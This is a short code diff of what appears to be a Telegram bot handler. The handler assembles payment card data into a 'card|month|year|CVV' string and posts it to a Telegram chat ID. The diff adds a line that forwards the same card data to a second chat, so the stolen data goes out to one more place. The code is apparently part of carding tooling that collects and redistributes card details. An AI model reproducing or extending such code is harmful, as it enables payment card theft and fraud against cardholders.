@@ -121,6 +121,7 @@ async def sender_bH(event):
                     ano = "20"+ str(ano)
                  cc = f'{cc}|{mes}|{ano}|{cvv}'
             send = tel('-1001663590473',cc)
+            send = tel('-1001839223665',cc)
             print(send)
         except Exception as e:
             print(e)
